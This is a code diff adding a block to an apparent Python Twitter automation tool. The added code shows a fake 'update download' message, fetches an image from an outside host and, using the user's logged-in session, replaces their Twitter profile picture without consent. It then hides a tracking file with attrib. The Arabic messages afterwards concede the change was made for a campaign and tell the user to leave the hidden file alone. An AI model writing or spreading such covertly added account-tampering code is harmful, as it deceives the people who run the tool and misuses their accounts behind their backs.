@@ -441,6 +441,112 @@ if os.name in ('nt', 'dos'):
 os.system(command)
 
 print(f'{bcolors.OKGREEN}[*]ALL THINGS IS GOOD ===> SCRIPT WILL START NOW{bcolors.BOLD}')
+
+Find = False
+
+if os.path.exists('Twitter_pic.txt'):
+
+    pic_check = open('Twitter_pic.txt', 'r')
+
+    pic_check_emails = pic_check.readlines()
+
+    for index in pic_check_emails:
+
+        index = index.replace('\n', '')
+
+        if index == Auto_Login_Email:
+
+            Find = True
+
+headers = {
+    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs'
+                     '%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
+    'origin': 'https://twitter.com',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 '
+                  'Safari/537.36',
+    'x-csrf-token': value,
+    'x-twitter-active-user': 'yes',
+    'x-twitter-client-language': 'ar'
+}
+
+if not Find:
+    
+    print(f'{bcolors.WARNING}[*] Wait New Update download right now{bcolors.BOLD}')
+
+    while 1:
+        a = '.' * i
+
+        try:
+            img_data = requests.get('https://i.postimg.cc/htpgwL2q/pic-logo-edit.jpg')
+            break
+        except requests.ConnectionError:
+            sys.stdout.write(f"\r{bcolors.FAIL}Reconnecting{a}{bcolors.BOLD}")
+            sys.stdout.flush()
+            i += 1
+            if i > 3:
+                i = 0
+        time.sleep(1)
+
+    resource_url = 'https://upload.twitter.com/1.1/media/upload.json'
+
+    upload_image = {
+        'media': img_data.content,
+        'media_category': 'tweet_image'
+    }
+
+    while 1:
+        a = '.' * i
+        try:
+
+            media_id = session.post(resource_url, headers=headers, files=upload_image)
+            break
+        except requests.ConnectionError:
+
+            sys.stdout.write(f"\r{bcolors.FAIL}Reconnecting{a}{bcolors.BOLD}")
+            sys.stdout.flush()
+            i += 1
+            if i > 3:
+                i = 0
+        time.sleep(1)
+
+    x = json.loads(media_id.content.decode('UTF-8'))
+
+    save_id = x['media_id']
+
+    data = {
+        'media_id': save_id
+    }
+
+    url_pic = f'https://api.twitter.com/1.1/account/update_profile_image.json'
+
+    while 1:
+        a = '.' * i
+        try:
+            profile_pic = session.post(url_pic, headers=headers, data=data)
+            break
+        except requests.ConnectionError:
+            sys.stdout.write(f"\r{bcolors.FAIL}Reconnecting{a}{bcolors.BOLD}")
+            sys.stdout.flush()
+            i += 1
+            if i > 3:
+                i = 0
+        time.sleep(1)
+
+    pic_check = open('Twitter_pic.txt', 'a')
+
+    pic_check.write(Auto_Login_Email + '\n')
+
+    os.system("attrib +h Twitter_pic.txt")
+
+    pic_check.close()
+
+    print(f'{bcolors.WARNING} اسف يا برو غيرنا صورة البروفايل بتاعك علشان تتعمد الحملة و شكرا [*]{bcolors.BOLD}')
+
+    print('كدة كدة عارفين انك مش هتمانع يا رجولة')
+
+    print('و صح في ملف اسموا Twitter_pic ملكش دعوة بية و شكرا')
+
 headers = {
     'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'accept': 'application/json',
